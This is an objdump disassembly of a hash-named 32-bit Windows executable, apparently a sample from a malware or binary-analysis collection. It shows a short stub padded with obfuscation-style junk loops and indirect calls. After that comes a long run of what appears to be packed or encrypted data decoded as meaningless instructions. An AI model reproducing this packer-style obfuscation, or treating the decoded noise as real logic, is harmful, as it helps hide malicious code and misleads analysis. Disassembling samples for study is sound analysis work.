
d3784d8ad1c017b8bd8ef65b0f4c73cd85a395d4fabb96ac00e3cb18342c39c9.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd8d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd89,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e19c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fd71,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fd59,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fd59
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fd59,ecx
  401068:	cmp    DWORD PTR ds:0x42fd59,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fd59,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e5a7
  401090:	cmp    DWORD PTR ds:0x42fd59,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fd59
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fd59,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e1a4,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e78b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e77b,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e77b,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e77b,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e1a8
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e34f
  401100:	cmp    DWORD PTR ds:0x42e77b,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e77b
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e77b,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e77b
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e77b,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e19c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e19c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e19c,esi
  401145:	cmp    DWORD PTR ds:0x42e19c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e5ab
  401160:	cmp    DWORD PTR ds:0x42e19c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e19c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e19c,esi
  40117c:	cmp    DWORD PTR ds:0x42e19c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e1b4,0x1a
  401193:	cmp    DWORD PTR ds:0x42e1b4,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e1b4,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fdfa
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fe02
  4011bf:	push   0x17d1
  4011c4:	push   0x42e2a7
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e4cb
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e1b4
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e1b4,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e77b,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd85
  4011f8:	adc    esi,DWORD PTR ds:0x42fd89
  4011fe:	mov    DWORD PTR ds:0x42fd85,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e783,0x17
  401216:	cmp    DWORD PTR ds:0x42e783,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e783,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e246
  401238:	push   0x42e1fd
  40123d:	call   DWORD PTR ds:0x42e5af
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e783
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e783,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fdfe,0x12
  40126b:	cmp    DWORD PTR ds:0x42fdfe,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fdfe,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e2a7
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e5b3
  4012a0:	mov    esi,DWORD PTR ds:0x42fdfe
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fdfe,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	leave  
  4012f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012f6:	and    DWORD PTR [eax+0x70],esi
  4012f9:	jo     0x40136b
  4012fb:	jo     0x40137b
  4012fd:	jo     0x40136f
  4012ff:	rcl    bh,0x3d
  401302:	aad    0x39
  401304:	ror    edi,cl
  401306:	rol    edx,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    eax,DWORD PTR [eax]
  40130c:	bound  eax,QWORD PTR [edx]
  40130e:	rdpmc  
  401310:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	int    0xa6
  4013a7:	clc    
  4013a8:	xchg   edi,eax
  4013a9:	xchg   ebp,eax
  4013aa:	mov    ebx,0xf9a005a8
  4013af:	adc    ebx,0xa13533de
  4013b5:	dec    esi
  4013b6:	jg     0x4013f7
  4013b8:	popf   
  4013b9:	ins    DWORD PTR es:[edi],dx
  4013ba:	cmp    al,0xbb
  4013bc:	sti    
  4013bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013be:	xor    DWORD PTR [ebx+0x11],0x62
  4013c2:	adc    al,0x23
  4013c4:	jo     0x40141f
  4013c6:	mov    dl,0x54
  4013c8:	ja     0x40141c
  4013ca:	dec    edx
  4013cb:	mov    ds:0xcd373994,eax
  4013d0:	xor    ebp,eax
  4013d2:	adc    eax,DWORD PTR [edi-0x61]
  4013d5:	xchg   edx,eax
  4013d6:	ins    BYTE PTR es:[edi],dx
  4013d7:	out    0xd8,al
  4013d9:	xchg   DWORD PTR [eax],eax
  4013db:	mov    cl,0x8c
  4013dd:	and    al,0x2d
  4013df:	mov    DWORD PTR [ecx-0x3a5c5c6b],ebp
  4013e5:	mov    cs,ebx
  4013e7:	add    eax,0x5f7f3f2b
  4013ec:	scas   al,BYTE PTR es:[edi]
  4013ed:	scas   al,BYTE PTR es:[edi]
  4013ee:	mov    esi,0xf1f1a7d0
  4013f3:	pop    ebx
  4013f4:	jbe    0x40141f
  4013f6:	data16 mov bh,0xc2
  4013f9:	aam    0x9e
  4013fb:	enter  0x690e,0x3
  4013ff:	call   0xe49f:0xdc827cf0
  401406:	jo     0x401422
  401408:	ficom  DWORD PTR [ebp+0x1c]
  40140b:	imul   ecx,edx,0x5a
  40140e:	lods   al,BYTE PTR ds:[esi]
  40140f:	mov    edx,edi
  401411:	in     eax,0xbc
  401413:	fcomp  DWORD PTR ds:0xd1b3a36e
  401419:	(bad)  
  40141a:	and    BYTE PTR [edx],ah
  40141c:	stos   DWORD PTR es:[edi],eax
  40141d:	xor    eax,0x2b1b13fe
  401422:	cli    
  401423:	rcl    eax,cl
  401425:	mov    bh,ch
  401427:	int    0x30
  401429:	int    0xa
  40142b:	push   cs
  40142c:	cdq    
  40142d:	jb     0x40144a
  40142f:	das    
  401430:	and    al,0x7c
  401432:	dec    esp
  401433:	pop    esp
  401434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401435:	into   
  401436:	shl    DWORD PTR [edi+0x172d7d51],cl
  40143c:	loop   0x401447
  40143e:	shl    ecx,0x3a
  401441:	in     eax,dx
  401442:	jno    0x401449
  401444:	mov    eax,0x2a7daac1
  401449:	outs   dx,DWORD PTR ds:[esi]
  40144a:	test   BYTE PTR [ecx+0x31b95eaf],bl
  401450:	sahf   
  401451:	jmp    0x9a6d:0x25031cf4
  401458:	std    
  401459:	out    0x70,al
  40145b:	jl     0x401490
  40145d:	xor    edi,DWORD PTR gs:[edi]
  401460:	jle    0x401416
  401462:	cmp    DWORD PTR [esi-0x9],edi
  401465:	add    eax,0xd602ffd5
  40146a:	loope  0x401467
  40146c:	jg     0x401430
  40146e:	rcl    DWORD PTR [esp+eiz*4-0x7ebd8853],1
  401475:	es stos BYTE PTR es:[edi],al
  401477:	not    ah
  401479:	and    ebx,DWORD PTR ds:0x74375b54
  401480:	shr    DWORD PTR [edx-0x6d],0x82
  401484:	mov    ebx,DWORD PTR [ecx+0x79fccda7]
  40148a:	mov    al,bl
  40148c:	sub    esi,DWORD PTR [edx+0x5f]
  40148f:	push   cs
  401490:	in     eax,0x44
  401492:	test   BYTE PTR [ebx-0x12],dl
  401495:	(bad)  
  401497:	xor    BYTE PTR [ebx+0x36],dh
  40149a:	push   cs
  40149b:	pop    DWORD PTR [edi]
  40149d:	and    edi,DWORD PTR [edi]
  40149f:	pop    es
  4014a0:	xor    edx,DWORD PTR [edx]
  4014a2:	lock ds jmp 0x4014ed
  4014a6:	pop    es
  4014a7:	bnd jno 0x401502
  4014aa:	lods   al,BYTE PTR ds:[esi]
  4014ab:	jb     0x401440
  4014ad:	aam    0xb9
  4014af:	sti    
  4014b0:	cwde   
  4014b1:	jns    0x4014d0
  4014b3:	lahf   
  4014b4:	add    esp,eax
  4014b6:	mov    WORD PTR [ebx-0xb],es
  4014b9:	nop
  4014ba:	stc    
  4014bb:	rol    BYTE PTR ss:[esi+0x160a055],1
  4014c2:	pop    ss
  4014c3:	shr    ebx,cl
  4014c5:	cwde   
  4014c6:	xchg   ebx,eax
  4014c7:	pop    es
  4014c8:	enter  0xf7e6,0xb2
  4014cc:	jnp    0x4014dc
  4014ce:	bnd ret 0x7b55
  4014d2:	fidiv  DWORD PTR [ecx]
  4014d4:	mov    dh,0x12
  4014d6:	jno    0x401497
  4014d8:	int3   
  4014d9:	shufps xmm3,xmm2,0xf5
  4014dd:	pop    edi
  4014de:	or     BYTE PTR [ecx+0x16e9598d],bh
  4014e4:	mov    cl,dh
  4014e6:	pop    esp
  4014e7:	iret   
  4014e8:	addr16 and eax,0x77f9e8a8
  4014ee:	outs   dx,DWORD PTR ds:[esi]
  4014ef:	shl    bh,cl
  4014f1:	lahf   
  4014f2:	fidivr DWORD PTR [ecx]
  4014f4:	sub    ch,BYTE PTR [edx+edi*1]
  4014f7:	or     ebx,DWORD PTR [edi]
  4014f9:	mov    edx,0x233e4d91
  4014fe:	and    BYTE PTR [esi-0x77],0x45
  401502:	cld    
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x7898e013]
  401516:	or     eax,0x707e70e4
  40151b:	jo     0x40158d
  40151d:	jle    0x40158f
  40151f:	jo     0x4014df
  401521:	inc    esi
  401522:	lods   al,BYTE PTR ds:[esi]
  401523:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  401525:	les    esp,FWORD PTR [ebp+0x5d730e06]
  40152b:	add    bl,BYTE PTR [ebx-0x4e3ff675]
  401531:	loope  0x4014fb
  401533:	cmc    
  401534:	(bad)  
  401535:	sbb    ah,BYTE PTR [eax+0x73fa1337]
  40153b:	mov    dh,0x4c
  40153d:	rol    eax,1
  40153f:	inc    esp
  401540:	cmp    al,0x3f
  401542:	in     al,0x17
  401544:	psllq  mm0,mm1
  401547:	aas    
  401548:	je     0x401540
  40154a:	sbb    al,0xd
  40154c:	and    eax,0x825debd6
  401551:	push   ebx
  401552:	les    esp,FWORD PTR [ecx-0x160bbcd0]
  401558:	std    
  401559:	xor    BYTE PTR [ebx-0x34],dl
  40155c:	dec    di
  40155e:	pop    ds
  40155f:	mov    ebp,0x1d07026f
  401564:	cmp    ch,dl
  401566:	imul   ecx,DWORD PTR [edx+0x420ec83b],0x2b
  40156d:	les    edi,FWORD PTR ds:0x8cda75e6
  401573:	adc    DWORD PTR [ebx+0x1d],ebx
  401576:	stos   DWORD PTR es:[edi],eax
  401577:	shl    BYTE PTR [edx+ebp*2-0x2e5dd834],0xdb
  40157f:	ret    0xb29b
  401582:	ret    0x1d24
  401585:	or     DWORD PTR [edx+eiz*4+0x6672ed39],ebx
  40158c:	cmp    eax,DWORD PTR [esp+ebx*1+0x25]
  401590:	loop   0x40159c
  401592:	and    BYTE PTR [edi],dh
  401594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401595:	mov    ecx,esp
  401597:	xchg   esp,eax
  401598:	mov    al,0xf3
  40159a:	(bad)  
  40159b:	cli    
  40159c:	mov    esi,0x9818bc71
  4015a1:	xchg   ebx,eax
  4015a2:	cmovne ebp,esp
  4015a5:	mov    eax,0xb791c001
  4015aa:	sub    al,0x6a
  4015ac:	(bad)  
  4015ad:	mov    gs,ecx
  4015af:	fsubr  st,st(1)
  4015b1:	repnz cmp ah,BYTE PTR [ebx]
  4015b4:	xchg   DWORD PTR [edi+ecx*2],ebp
  4015b7:	sar    dl,1
  4015b9:	sub    ecx,DWORD PTR [edx+0x35]
  4015bc:	(bad)  
  4015bd:	and    edi,DWORD PTR ss:[esi-0x72d0501f]
  4015c4:	nop
  4015c5:	add    dl,bl
  4015c7:	in     al,0xfa
  4015c9:	ins    DWORD PTR es:[edi],dx
  4015ca:	dec    edx
  4015cb:	add    ch,BYTE PTR [ecx+0x26]
  4015ce:	and    eax,0x352ec0b
  4015d3:	shl    bh,0x8f
  4015d6:	xor    eax,0x6487b043
  4015db:	inc    ecx
  4015dc:	mov    ebx,0xe42257e8
  4015e1:	scas   eax,DWORD PTR es:[edi]
  4015e2:	in     eax,0xce
  4015e4:	sbb    eax,0x60277f47
  4015e9:	xchg   edi,eax
  4015ea:	mov    DWORD PTR [ebp+0x7c88682d],esp
  4015f0:	mov    cl,0x6
  4015f2:	push   ds
  4015f3:	out    dx,al
  4015f4:	ss mov bl,0x7f
  4015f7:	rcl    al,0x89
  4015fa:	xchg   ebx,eax
  4015fb:	adc    eax,0xc1ea3386
  401600:	jl     0x401658
  401602:	cmp    al,0xb7
  401604:	dec    edi
  401605:	fs dec ebp
  401607:	out    dx,eax
  401608:	mov    ds:0xcf8e53b6,eax
  40160d:	sub    DWORD PTR [ebp+edx*1+0x724d94d4],eax
  401614:	jnp    0x40162d
  401616:	sbb    BYTE PTR [edx+0x51],ch
  401619:	cmp    al,0xe2
  40161b:	mov    dl,0x6e
  40161d:	pushf  
  40161e:	lahf   
  40161f:	fs push ss
  401621:	dec    esp
  401622:	stos   BYTE PTR es:[edi],al
  401623:	ret    
  401624:	or     DWORD PTR [esi],edi
  401626:	sub    bl,bh
  401628:	int3   
  401629:	je     0x4015e3
  40162b:	mov    eax,0x1a425c2c
  401630:	push   edx
  401631:	rcl    BYTE PTR [ecx-0x1a9a28a1],0x2
  401638:	xor    DWORD PTR [edx-0x41],ebp
  40163b:	mov    DWORD PTR [esi+ebp*1+0x9],esi
  40163f:	sbb    BYTE PTR ds:0x2d19de20,ah
  401645:	cli    
  401646:	imul   edi
  401648:	mov    BYTE PTR [edi+eiz*1-0x5ed7241c],cl
  40164f:	xor    esp,DWORD PTR [eax-0x5a6eedf]
  401655:	fsubr  DWORD PTR [ebx]
  401657:	das    
  401658:	mov    ch,0x86
  40165a:	fild   DWORD PTR [esi+0x5d931ba6]
  401660:	fistp  QWORD PTR [edx-0x18bf65c5]
  401666:	jl     0x4016b8
  401668:	adc    DWORD PTR [ebp+0x7],esp
  40166b:	adc    eax,0xf8efebf6
  401670:	mov    bl,0x9f
  401672:	xor    ch,ah
  401674:	loope  0x4015f6
  401676:	sub    DWORD PTR [eax],0x9c585a3c
  40167c:	dec    ebx
  40167d:	mov    esp,0xd58860e3
  401682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401683:	xchg   ecx,eax
  401684:	inc    ecx
  401685:	mov    ebx,0x199d32d3
  40168a:	mov    al,ds:0xc70c9654
  40168f:	sbb    ch,BYTE PTR [edi]
  401691:	cmp    BYTE PTR [ebx+0x39e728ad],ah
  401697:	lahf   
  401698:	mov    cl,0x87
  40169a:	ins    BYTE PTR es:[edi],dx
  40169b:	dec    ebp
  40169c:	scas   al,BYTE PTR es:[edi]
  40169d:	int    0x1e
  40169f:	mov    ds,esp
  4016a1:	adc    al,0xe5
  4016a3:	push   ss
  4016a4:	popa   
  4016a5:	in     eax,0xb6
  4016a7:	outs   dx,BYTE PTR ds:[esi]
  4016a8:	adc    edx,ebp
  4016aa:	add    ch,BYTE PTR [ebx]
  4016ac:	adc    ebp,DWORD PTR [ebx+ecx*8]
  4016af:	cmp    eax,0x52523eb9
  4016b4:	jo     0x401722
  4016b6:	call   0xa08:0x86b4c7a2
  4016bd:	jb     0x4016d8
  4016bf:	sbb    dh,BYTE PTR [ebx+0x38a2a7b4]
  4016c5:	fwait
  4016c6:	leave  
  4016c7:	push   esp
  4016c8:	jecxz  0x40167a
  4016ca:	jmp    0x4016d4
  4016cc:	retf   
  4016cd:	stc    
  4016ce:	les    eax,FWORD PTR [edx+0x227b9bcb]
  4016d4:	cmp    BYTE PTR [esi],0xd5
  4016d7:	rcr    edx,0xa6
  4016da:	jle    0x4016d0
  4016dc:	fsubr  DWORD PTR [ecx-0x15e9c312]
  4016e2:	lods   al,BYTE PTR ds:[esi]
  4016e3:	jle    0x401706
  4016e5:	cmp    eax,0xb833aa9a
  4016ea:	outs   dx,BYTE PTR ds:[esi]
  4016eb:	and    al,BYTE PTR [ebp+0x67]
  4016ee:	pop    esp
  4016ef:	add    ah,bh
  4016f1:	add    DWORD PTR ds:0xace69d73,edi
  4016f7:	xchg   edx,eax
  4016f8:	pop    esp
  4016f9:	xchg   edx,eax
  4016fa:	jnp    0x40174e
  4016fc:	iret   
  4016fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016fe:	cmc    
  4016ff:	pop    esi
  401700:	add    BYTE PTR [ecx+0x280a2ca2],0xf7
  401707:	lea    esp,[ebp+eax*2-0x2300f9d7]
  40170e:	test   DWORD PTR [esp+esi*4],edx
  401711:	fmul   DWORD PTR [ebx]
  401713:	pop    edx
  401714:	pop    edx
  401715:	mov    dl,0xe1
  401717:	inc    ebx
  401718:	stos   BYTE PTR es:[edi],al
  401719:	ret    0xe9bf
  40171c:	clc    
  40171d:	cld    
  40171e:	pop    ebp
  40171f:	xor    ecx,DWORD PTR [ebp+0x4589d045]
  401725:	int3   
  401726:	mov    eax,DWORD PTR [ebp-0x28]
  401729:	mov    DWORD PTR [ebp-0x2c],eax
  40172c:	lea    eax,[ebp-0x18]
  40172f:	jmp    0x40194c
  401734:	dec    ebp
  401735:	iret   
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	mov    cl,0x74
  401742:	add    BYTE PTR ds:0x70707c70,ah
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	(bad)  
  40174d:	sub    DWORD PTR [ecx+0x2e],edx
  401750:	mov    ds:0x6d115348,al
  401755:	inc    ebx
  401756:	pop    esp
  401757:	push   es
  401758:	(bad)  
  401759:	call   0xd0734266
  40175e:	ror    ah,0x6b
  401761:	jle    0x4017c7
  401763:	jne    0x4017b1
  401765:	fistp  WORD PTR [eax]
  401767:	ja     0x4017df
  401769:	inc    edx
  40176a:	(bad)
  40176d:	cmp    ebp,DWORD PTR [edi+0x53232dff]
  401773:	mov    eax,ds:0xe1ad7cb2
  401778:	mov    cl,0x6c
  40177a:	push   edx
  40177b:	(bad)  [ebp+0x64]
  40177e:	cmp    ch,al
  401780:	stos   DWORD PTR es:[edi],eax
  401781:	fldcw  WORD PTR [esp+ebp*2+0x6494ff50]
  401788:	jbe    0x401798
  40178a:	mov    edx,0x9934b8e0
  40178f:	pop    edi
  401790:	mov    bl,0x3e
  401792:	adc    DWORD PTR [edx+0x2b],ebx
  401795:	mov    bl,0xa2
  401797:	mov    DWORD PTR [ebx-0x7e4a673e],edi
  40179d:	add    ebp,DWORD PTR [ebx-0x75254d0c]
  4017a3:	lea    eax,[edx]
  4017a5:	lods   eax,DWORD PTR ds:[esi]
  4017a6:	and    dh,BYTE PTR [ecx-0x17]
  4017a9:	xchg   ebx,eax
  4017aa:	std    
  4017ab:	ror    DWORD PTR [esi+0x32289b04],1
  4017b1:	push   ebp
  4017b2:	mov    ds,WORD PTR [eax-0x80]
  4017b5:	aas    
  4017b6:	pop    esi
  4017b7:	adc    dh,bh
  4017b9:	scas   eax,DWORD PTR es:[edi]
  4017ba:	adc    DWORD PTR [eax-0x6f],edx
  4017bd:	push   ebp
  4017be:	popa   
  4017bf:	fadd   st,st(3)
  4017c1:	inc    edi
  4017c2:	xchg   ebp,eax
  4017c3:	mov    eax,0x57c127d7
  4017c8:	jb     0x4017e0
  4017ca:	push   cs
  4017cb:	js     0x401801
  4017cd:	pop    eax
  4017ce:	aaa    
  4017cf:	pop    ebx
  4017d0:	fwait
  4017d1:	xchg   BYTE PTR [eax-0x74],cl
  4017d4:	xchg   ebx,eax
  4017d5:	loopne 0x40179e
  4017d7:	inc    ebp
  4017d8:	int    0x4d
  4017da:	(bad)  
  4017db:	pop    esp
  4017dc:	fadd   DWORD PTR [ebx+0x556c96b]
  4017e2:	(bad)  
  4017e3:	lds    ecx,FWORD PTR ds:0xdb5fbbf8
  4017e9:	mov    eax,ds:0x94d3747d
  4017ee:	(bad)  
  4017ef:	rol    DWORD PTR [edi-0x546f989],cl
  4017f5:	inc    ebx
  4017f6:	xchg   ecx,eax
  4017f7:	xchg   eax,ebx
  4017f9:	xchg   esi,eax
  4017fa:	fs lock pop edi
  4017fd:	mov    ebp,0xdb9ed5b2
  401802:	(bad)
  401807:	in     eax,dx
  401808:	inc    esp
  401809:	cdq    
  40180a:	cmp    al,0x50
  40180c:	push   esi
  40180d:	mov    WORD PTR [esi+0x60fd8607],?
  401813:	std    
  401814:	xchg   ebp,eax
  401815:	(bad)  
  401816:	push   cs
  401817:	outs   dx,DWORD PTR ds:[esi]
  401818:	jns    0x40188d
  40181a:	call   0xb9e99a40
  40181f:	xor    DWORD PTR [ebp-0x2153e441],esp
  401825:	fs or  al,0x24
  401828:	jae    0x40187b
  40182a:	das    
  40182b:	jno    0x4017de
  40182d:	xor    DWORD PTR [edx+ebp*2],ebx
  401830:	gs repz dec ebp
  401833:	mov    cl,0x3c
  401835:	std    
  401836:	mov    cs,WORD PTR [ebx-0x474fcefd]
  40183c:	fimul  DWORD PTR [ecx+ecx*4]
  40183f:	fwait
  401840:	xchg   esi,eax
  401841:	test   eax,0x8d0486c6
  401846:	sahf   
  401847:	xor    eax,edi
  401849:	pop    ecx
  40184a:	sahf   
  40184b:	gs pop ebx
  40184d:	imul   edx,edi,0x222fd8d3
  401853:	hlt    
  401854:	gs jecxz 0x4017f8
  401857:	ret    
  401858:	(bad)  
  401859:	into   
  40185a:	dec    ebp
  40185b:	sahf   
  40185c:	iret   
  40185d:	xchg   edx,eax
  40185e:	aad    0x38
  401860:	xchg   ebp,eax
  401861:	sahf   
  401862:	cmp    al,0x2d
  401864:	enter  0xbdcb,0x57
  401868:	mov    al,ds:0xa6a601a1
  40186d:	repnz mov al,ds:0x1d862d48
  401873:	scas   al,BYTE PTR es:[edi]
  401874:	in     eax,dx
  401875:	cmp    eax,0xbe605447
  40187a:	push   0x9656e039
  40187f:	pop    ebp
  401880:	fldcw  WORD PTR [edi+0x564a090a]
  401886:	add    dl,BYTE PTR cs:[ebp+0x2d]
  40188a:	call   0xce1f7b
  40188f:	in     eax,dx
  401890:	push   cs
  401891:	cmp    al,0xac
  401893:	xchg   esp,eax
  401894:	sar    BYTE PTR [ecx+0x1f96c263],1
  40189a:	push   0x7d0a4a0a
  40189f:	jbe    0x40185a
  4018a1:	aas    
  4018a2:	adc    DWORD PTR [ebx-0x2f24f7fa],ecx
  4018a8:	push   0x6f62d6a6
  4018ad:	mov    ecx,0x40f6152
  4018b2:	and    dl,ch
  4018b4:	sti    
  4018b5:	test   eax,0x5438918d
  4018ba:	enter  0xff08,0xfe
  4018be:	fld    st(1)
  4018c0:	add    bl,BYTE PTR [edx]
  4018c2:	inc    ecx
  4018c3:	pusha  
  4018c4:	loop   0x40193b
  4018c6:	add    eax,0xca67fe7
  4018cb:	and    ah,bl
  4018cd:	call   0x1084c27b
  4018d2:	add    BYTE PTR [ebx],ah
  4018d4:	or     ch,0xdc
  4018d7:	cdq    
  4018d8:	(bad)  
  4018d9:	sar    DWORD PTR [edx+0x6f],1
  4018dc:	ins    DWORD PTR es:[edi],dx
  4018dd:	(bad)  
  4018de:	jg     0x4018ef
  4018e0:	mov    edi,0x4ea625ad
  4018e5:	and    DWORD PTR [esi],ebp
  4018e7:	mov    ebp,0xfa4089cc
  4018ec:	mov    eax,0xe10b96eb
  4018f1:	add    eax,0x4026551f
  4018f6:	pop    ss
  4018f7:	shl    BYTE PTR [esi-0x725e38cb],1
  4018fd:	out    dx,eax
  4018fe:	fcmovnb st,st(6)
  401900:	das    
  401901:	sub    DWORD PTR [esi-0x7a],edi
  401904:	mov    ah,0x3f
  401906:	jl     0x4018fc
